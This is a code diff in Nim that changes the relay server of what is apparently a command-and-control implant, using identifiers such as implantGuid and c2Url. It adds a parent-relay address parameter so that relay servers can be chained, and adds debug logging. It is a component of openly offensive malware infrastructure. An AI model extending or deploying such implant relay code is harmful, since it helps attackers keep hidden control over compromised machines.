@@ -14,19 +14,23 @@ var g_relayServerStarted: bool = false
 var g_relayServerPort: int = 0
 
 # Background proc to run relay server (non-blocking)
-proc runRelayServerInBackground(port: int, implantGuid: string, c2Url: string) =
+proc runRelayServerInBackground(port: int, implantGuid: string, parentAddr: string, c2Url: string) =
     when defined debug:
         echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
+        if parentAddr != "":
+            echo "[RELAY] 🔧 Parent: " & parentAddr
+        if c2Url != "":
+            echo "[RELAY] 🔧 C2 URL: " & c2Url
     try:
         # startRelayServer is async, need to wait for it
-        waitFor http_relay.startRelayServer(port, implantGuid, c2Url)
+        waitFor http_relay.startRelayServer(port, implantGuid, parentAddr, c2Url)
     except Exception as e:
         when defined debug:
             echo "[RELAY] ❌ Background relay server crashed: " & e.msg
 
 # Start HTTP relay server with dynamic port (runtime command)
 # Returns immediately after spawning background server
-proc startRelayServerWithPort*(port: int, implantGuid: string, c2Url: string = ""): bool =
+proc startRelayServerWithPort*(port: int, implantGuid: string, parentAddr: string = "", c2Url: string = ""): bool =
     # Idempotent guard: return early if already started
     if g_relayServerStarted:
         when defined debug:
@@ -36,15 +40,19 @@ proc startRelayServerWithPort*(port: int, implantGuid: string, c2Url: string = "
     when defined debug:
         echo "[RELAY] 🚀 Starting HTTP Relay server on port " & $port
         echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
+        if parentAddr != "":
+            echo "[RELAY] 🔗 Parent relay: " & parentAddr
+        if c2Url != "":
+            echo "[RELAY] 🎯 C2 URL: " & c2Url
     
     # Start relay server in background thread (non-blocking)
     try:
         # Spawn background thread
         when compileOption("threads"):
-            spawn runRelayServerInBackground(port, implantGuid, c2Url)
+            spawn runRelayServerInBackground(port, implantGuid, parentAddr, c2Url)
         else:
             # Fallback: start in current thread (will block, but at least works)
-            runRelayServerInBackground(port, implantGuid, c2Url)
+            runRelayServerInBackground(port, implantGuid, parentAddr, c2Url)
         
         g_relayServerStarted = true  # Mark as started
         g_relayServerPort = port
